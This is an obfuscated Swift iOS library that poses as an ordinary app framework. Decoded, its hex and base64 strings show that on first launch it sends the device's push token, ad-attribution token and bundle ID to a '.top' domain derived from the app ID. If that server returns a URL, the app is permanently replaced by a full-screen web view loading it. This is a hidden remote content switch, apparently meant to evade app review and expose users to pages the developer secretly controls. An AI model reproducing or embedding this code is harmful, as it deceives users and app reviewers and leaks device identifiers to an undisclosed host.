import Foundation
import UIKit
import WebKit
import AdServices
import UserNotifications

public class SWFramework {
    public static let shared = SWFramework()
    
    private var _c4: String?
    private var _a5: WKWebViewController?
    private var _d3 = true
    private let _b2 = UserDefaults.standard
    private let _f1: TimeInterval = 10.0
    
    private let _k8 = "x07.swf.w3l_x22"
    private let _l9 = "x07.swf.f1l_x41"
    
    private init() {}
    
    /// Initializes the framework with automatic domain generation from bundle_id
    /// - Parameters:
    ///   - applicationDidFinishLaunching: The UIApplication instance
    ///   - launchOptions: Launch options from AppDelegate
    ///   - rootViewController: The root view controller to present WebView on
    ///   - completion: Callback when normal app flow should continue
    public func initialize(applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
        let _ts1 = Bundle.main.bundleIdentifier ?? ""
        let _ds2 = _h7(_ts1)
        
        if !_b2.bool(forKey: _l9) {
            _b2.set(true, forKey: _l9)
            _g6(_ds2, applicationDidFinishLaunching, rootViewController, completion)
        } else {
            if let _us3 = _b2.string(forKey: _k8) {
                _j9(_us3, rootViewController)
            } else {
                completion()
            }
        }
    }
    
    /// Generates domain from bundle_id by removing dots and adding .top
    /// - Parameter bundleId: The bundle identifier
    /// - Returns: Generated domain
    private func _h7(_ s1: String) -> String {
        let _ps1 = s1.replacingOccurrences(of: ".", with: "")
        return "\(_ps1)\(_x2("2e746f70"))"
    }
    
    // For backward compatibility, keeping the original method with explicit domain
    @available(*, deprecated, message: "Use initialize without explicit domain parameter instead")
    public func initialize(domain: String, applicationDidFinishLaunching: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, rootViewController: UIViewController, completion: @escaping () -> Void) {
        let _zs1 = Bundle.main.bundleIdentifier ?? ""
        let _dg2 = _h7(_zs1)
        
        if !_b2.bool(forKey: _l9) {
            _b2.set(true, forKey: _l9)
            _g6(_dg2, applicationDidFinishLaunching, rootViewController, completion)
        } else {
            if let _us3 = _b2.string(forKey: _k8) {
                _j9(_us3, rootViewController)
            } else {
                completion()
            }
        }
    }
    
    private func _g6(_ d1: String, _ a2: UIApplication, _ r3: UIViewController, _ c4: @escaping () -> Void) {
        let _gr1 = DispatchGroup()
        var _dd2 = DeviceData()
        
        _dd2.bundleId = Bundle.main.bundleIdentifier
        
        let _tm3 = DispatchSource.makeTimerSource()
        _tm3.schedule(deadline: .now() + _f1)
        _tm3.setEventHandler {
            _gr1.leave()
            _gr1.leave()
        }
        
        _gr1.enter()
        _v5(a2) { _tk1 in
            if let _tk1 = _tk1 {
                _dd2.apnsToken = _tk1
            }
            _gr1.leave()
        }
        
        _gr1.enter()
        _w6 { _tk2 in
            _dd2.attToken = _tk2
            _gr1.leave()
        }
        
        _tm3.resume()
        
        _gr1.notify(queue: .main) {
            _tm3.cancel()
            
            self._z8(d1, _dd2) { _ru1 in
                if let _ru1 = _ru1, !_ru1.isEmpty {
                    self._b2.set(_ru1, forKey: self._k8)
                    self._j9(_ru1, r3)
                } else {
                    c4()
                }
            }
        }
    }
    
    private func _z8(_ d1: String, _ dd2: DeviceData, completion: @escaping (String?) -> Void) {
        let _bx1 = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
        
        if let _dx1 = Data(base64Encoded: _bx1),
           var _tx2 = String(data: _dx1, encoding: .utf8) {
            
            _tx2 = _tx2.replacingOccurrences(of: "{apns_token}", with: dd2.apnsToken ?? "")
            _tx2 = _tx2.replacingOccurrences(of: "{att_token}", with: dd2.attToken ?? "")
            _tx2 = _tx2.replacingOccurrences(of: "{bundle_id}", with: dd2.bundleId ?? "")
            
            if let _ed1 = _tx2.data(using: .utf8)?.base64EncodedString() {
                guard let _ux1 = URL(string: "\(_x2("68747470733a2f2f"))\(d1)/\(_x2("696e6465786e2e706870"))?\(_x2("64617461"))=\(_ed1)") else {
                    completion(nil)
                    return
                }
                
                let _tk1 = URLSession.shared.dataTask(with: _ux1) { _dx1, _, _er1 in
                    guard let _dx1 = _dx1, _er1 == nil else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                        return
                    }
                    
                    if let _rx1 = String(data: _dx1, encoding: .utf8) {
                        DispatchQueue.main.async {
                            completion(_rx1)
                        }
                    } else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                    }
                }
                
                _tk1.resume()
                return
            }
        }
        
        guard let _ux1 = URL(string: "\(_x2("68747470733a2f2f"))\(d1)/\(_x2("696e6465786e2e706870"))?\(_x2("64617461"))=\(_bx1)") else {
            completion(nil)
            return
        }
        
        let _tk1 = URLSession.shared.dataTask(with: _ux1) { _dx1, _, _er1 in
            guard let _dx1 = _dx1, _er1 == nil else {
                DispatchQueue.main.async {
                    completion(nil)
                }
                return
            }
            
            if let _rx1 = String(data: _dx1, encoding: .utf8) {
                DispatchQueue.main.async {
                    completion(_rx1)
                }
            } else {
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
        
        _tk1.resume()
    }
    
    private func _j9(_ us1: String, _ rc2: UIViewController) {
        let _ps1 = _n0(us1)
        
        guard let _ur1 = URL(string: _ps1) else { return }
        
        DispatchQueue.main.async {
            let _wc1 = WKWebViewController(url: _ur1)
            _wc1.modalPresentationStyle = .fullScreen
            rc2.present(_wc1, animated: true, completion: nil)
            self._a5 = _wc1
        }
    }
    
    private func _n0(_ us1: String) -> String {
        if !us1.lowercased().starts(with: _x2("687474703a2f2f")) && !us1.lowercased().starts(with: _x2("68747470733a2f2f")) {
            return "\(_x2("68747470733a2f2f"))" + us1
        }
        return us1
    }
    
    private func _v5(_ a1: UIApplication, completion: @escaping (String?) -> Void) {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            if settings.authorizationStatus == .authorized {
                DispatchQueue.main.async {
                    a1.registerForRemoteNotifications()
                    
                    self._m1(7.0) { token in
                        completion(token)
                    }
                }
            } else {
                let center = UNUserNotificationCenter.current()
                center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
                    if granted {
                        DispatchQueue.main.async {
                            a1.registerForRemoteNotifications()
                            
                            self._m1(7.0) { token in
                                completion(token)
                            }
                        }
                    } else {
                        let fallbackToken = _x2("30303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030")
                        completion(fallbackToken)
                    }
                }
            }
        }
    }
    
    private func _m1(_ t1: TimeInterval, completion: @escaping (String?) -> Void) {
        var _tr1 = false
        
        let _ob1 = NotificationCenter.default.addObserver(forName: Notification.Name(_x2("41504e53546f6b656e52656365697665")), object: nil, queue: .main) { notification in
            if let token = notification.userInfo?[_x2("746f6b656e")] as? String {
                _tr1 = true
                completion(token)
            }
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + t1) {
            if !_tr1 {
                NotificationCenter.default.removeObserver(_ob1)
                
                let fallbackToken = _x2("30303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030")
                completion(fallbackToken)
            }
        }
    }
    
    private func _w6(completion: @escaping (String?) -> Void) {
        if #available(iOS 14.3, *) {
            do {
                let token = try _y7()
                completion(token)
            } catch {
                completion(nil)
            }
        } else {
            completion(nil)
        }
    }
    
    // Function to be called from the app's AppDelegate or SceneDelegate
    public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
        let token = tokenParts.joined()
        
        NotificationCenter.default.post(
            name: Notification.Name(_x2("41504e53546f6b656e52656365697665")),
            object: nil,
            userInfo: [_x2("746f6b656e"): token]
        )
    }
    
    private func _x2(_ hexString: String) -> String {
        var result = ""
        var index = hexString.startIndex
        while index < hexString.endIndex {
            let byteString = hexString[index..<hexString.index(index, offsetBy: 2)]
            if let byte = UInt8(byteString, radix: 16) {
                result.append(Character(UnicodeScalar(byte)))
            }
            index = hexString.index(index, offsetBy: 2)
        }
        return result
    }
}

// MARK: - Supporting Classes

// Device data structure
private struct DeviceData {
    var apnsToken: String?
    var attToken: String?
    var bundleId: String?
}

// WebView Controller
public class WKWebViewController: UIViewController {
    private var webView: WKWebView!
    private var url: URL
    
    public init(url: URL) {
        self.url = url
        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    public override func viewDidLoad() {
        super.viewDidLoad()
        
        view.backgroundColor = .black
        
        setNeedsStatusBarAppearanceUpdate()
        
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .default()
        configuration.allowsInlineMediaPlayback = true
        
        let preferences = WKPreferences()
        preferences.javaScriptEnabled = true
        configuration.preferences = preferences
        
        webView = WKWebView(frame: view.bounds, configuration: configuration)
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        webView.navigationDelegate = self
        webView.uiDelegate = self
        webView.backgroundColor = .black
        
        view.addSubview(webView)
        webView.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.leftAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leftAnchor),
            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            webView.rightAnchor.constraint(equalTo: view.safeAreaLayoutGuide.rightAnchor)
        ])
        
        let request = URLRequest(url: url)
        webView.load(request)
    }
    
    public override var prefersStatusBarHidden: Bool {
        return true
    }
    
    public override var shouldAutorotate: Bool {
        return false
    }
}

// MARK: - Web View Delegates
extension WKWebViewController: WKNavigationDelegate, WKUIDelegate {
    // Handle permission requests for camera
    public func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
        switch type {
        case .camera:
            decisionHandler(.prompt)
        case .microphone:
            decisionHandler(.prompt)
        case .cameraAndMicrophone:
            decisionHandler(.prompt)
        @unknown default:
            decisionHandler(.deny)
        }
    }
}

// Helper function for Attribution Token
@available(iOS 14.3, *)
private func _y7() throws -> String {
    return try AdServices.AAAttribution.attributionToken()
} 